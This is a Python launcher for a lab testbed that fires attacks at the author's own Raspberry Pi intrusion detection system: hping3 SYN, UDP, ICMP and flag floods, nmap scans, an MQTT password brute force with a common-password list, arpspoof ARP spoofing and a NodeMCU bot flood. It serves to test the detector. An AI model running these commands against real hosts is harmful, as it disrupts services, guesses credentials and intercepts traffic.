"""All attacks in one file, using the real tools: hping3, nmap, mosquitto_pub, arpspoof.
Run it INSIDE WSL (Ubuntu). Every attack first PRINTS the exact command, then runs it,
so you can also type the same command by hand.

cd /mnt/c/Users/HOME/Documents/iot/project/laptop
python3 launch.py 172.29.2.43            menu, every attack runs 10 s
python3 launch.py 172.29.2.43 5          menu, every attack runs 5 s
python3 launch.py 172.29.2.43 10 3       no menu: attack 3 for 10 s, then exit

  1  SYN flood            the Pi should say: DoS flood, block 30 s
  2  UDP flood            DoS flood, block
  3  port scan            Recon (model + rule), block; also asks: OS scan or vulnerability scan
  4  brute force          wrong MQTT passwords -> BruteForce (rule), block
  5  ICMP flood           (new model) DoS flood, block
  6  ACK / PSH-ACK / RST-FIN flood   asks which one; DoS flood, block
  7  ARP spoofing         asks for a NodeMCU IP; "that sensor is at MY MAC" -> blocked by MAC
  8  bot attack           asks udp, tcp or stop; the 3 NodeMCUs flood the Pi -> DDoS, quarantine
  9  all of them          1, 2, 3, 4, then bot tcp and bot udp, with a 6 s pause in between

One-time install in WSL:  sudo apt install hping3 nmap mosquitto-clients dsniff
(the old scapy version is launch_old.py)

What the hping3 words mean:
  -S          set the SYN flag (first packet of a TCP connection)
  --udp       send UDP instead of TCP
  -p 1884     target port
  -d 8        8 bytes of data in every packet
  -i u1000    wait 1000 microseconds between packets = about 1000 packets/s
  --rand-source   a random fake source IP on every packet
  timeout -s INT 10   stop after 10 s, like pressing Ctrl+C (hping3 then prints its summary)
"""
import os
import subprocess
import sys
import time

from bot import send_to_bots

MQTT_PORT = int(os.environ.get("MQTT_PORT", "1884"))   # our broker on the Pi (the Docker testbed sets 1883)
COAP_PORT = 5683          # UDP port the sensors use
PASSWORDS = ["123456", "password", "admin", "12345678", "qwerty", "123456789", "12345", "1234", "111111",
             "dragon", "letmein", "iot123", "raspberry", "mosquitto", "tinyids", "tinyids123"]


def run(command):
    """Print the command, then run it exactly as printed. Returns its exit code (0 = success)."""
    print(f"\n$ {command}", flush=True)
    return subprocess.run(command, shell=True).returncode


# ---------- floods (hping3) ----------

def syn_flood(pi, seconds):
    run(f"timeout -s INT {seconds} sudo hping3 -S -p {MQTT_PORT} -i u1000 {pi}")


def udp_flood(pi, seconds):
    run(f"timeout -s INT {seconds} sudo hping3 --udp -p {COAP_PORT} -d 8 -i u1000 {pi}")


def icmp_flood(pi, seconds):
    run(f"timeout -s INT {seconds} sudo hping3 --icmp -i u1000 {pi}")


def flag_flood(pi, seconds):
    flags = {"ack": "-A", "pshack": "-PA", "rstfin": "-RF"}.get(input("ack, pshack or rstfin? ").strip().lower(), "-A")
    run(f"timeout -s INT {seconds} sudo hping3 {flags} -p {MQTT_PORT} -i u1000 {pi}")


# ---------- the other attacks ----------

def port_scan(pi, seconds):
    # -sT: normal connect scan (no sudo). In WSL mirrored mode "sudo nmap -sS" shows every port as "filtered",
    # because Windows keeps the replies. -sT still sends one SYN per port, so the Pi sees the scan.
    kind = input("port, os or vuln scan? [port] ").strip().lower()
    if kind == "os":
        run(f"sudo nmap -O {pi}")
    elif kind == "vuln":
        run(f"nmap --script vuln -p {MQTT_PORT} {pi}")
    else:
        run(f"nmap -sT -T4 -p 1-1024 {pi}")


def brute_force(pi, seconds):
    print(f"MQTT brute force: user 'tinyids', {len(PASSWORDS)} common passwords")
    for password in PASSWORDS:
        code = run(f"timeout 3 mosquitto_pub -h {pi} -p {MQTT_PORT} -u tinyids -P {password} -t test -m hello")
        if code == 0:
            print(f"password found: {password}")
            return
        if code == 124:                             # 124 = timeout stopped it: no answer, the Pi has blocked us
            print("no answer: the Pi has blocked us")
            return
        time.sleep(0.1)
    print("no password found")


def my_interface(pi):
    """Name of the network card that reaches the Pi (from 'ip route get')."""
    words = subprocess.run(["ip", "route", "get", pi], capture_output=True, text=True).stdout.split()
    return words[words.index("dev") + 1] if "dev" in words else "eth0"


def arp_spoof(pi, seconds):
    victim = input("IP of the NodeMCU to pretend to be: ").strip()
    # -t {pi}: lie ONLY to the Pi: "{victim} is at my MAC". On stop, arpspoof sends the correct address back.
    run(f"timeout -s INT {seconds} sudo arpspoof -i {my_interface(pi)} -t {pi} {victim}")


def bot_attack(pi, seconds):
    kind = input("bots: udp, tcp or stop? ").strip().lower()
    kind = {"u": "udp", "t": "tcp", "s": "stop"}.get(kind, kind)
    if kind not in ("udp", "tcp", "stop"):
        print("type udp, tcp or stop")
        return
    print(f"\n$ python3 bot.py {kind} {seconds}")
    send_to_bots(kind, seconds)                 # the bots know the Pi's IP from their firmware


def all_attacks(pi, seconds):
    steps = [syn_flood, udp_flood, port_scan, brute_force,
             lambda p, s: send_to_bots("tcp", s), lambda p, s: send_to_bots("udp", s)]
    for number, step in enumerate(steps, 1):
        print(f"\n===== step {number} of {len(steps)} =====")
        step(pi, seconds)
        if number < len(steps):
            time.sleep(6)                  # let the traffic calm down before the next attack


ATTACKS = {"1": ("SYN flood", syn_flood), "2": ("UDP flood", udp_flood), "3": ("port scan", port_scan),
           "4": ("brute force", brute_force), "5": ("ICMP flood", icmp_flood),
           "6": ("ACK / PSH-ACK / RST-FIN flood", flag_flood), "7": ("ARP spoofing", arp_spoof),
           "8": ("bot attack (udp / tcp / stop)", bot_attack), "9": ("all of them", all_attacks)}


def start(number, pi, seconds):
    if number not in ATTACKS:
        print("no such attack")
        return
    ATTACKS[number][1](pi, seconds)


def menu(pi, seconds):
    while True:
        print(f"\ntarget {pi}, {seconds} s per attack")
        for number, (name, _) in ATTACKS.items():
            print(f"  {number}  {name}")
        choice = input("attack number (q = quit): ").strip().lower()
        if choice in ("q", "0", ""):
            return
        start(choice, pi, seconds)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        raise SystemExit("use:  python3 launch.py <pi ip> [seconds] [attack number]")
    pi = sys.argv[1]
    seconds = int(sys.argv[2]) if len(sys.argv) > 2 else 10
    if len(sys.argv) > 3:
        start(sys.argv[3], pi, seconds)
    else:
        menu(pi, seconds)
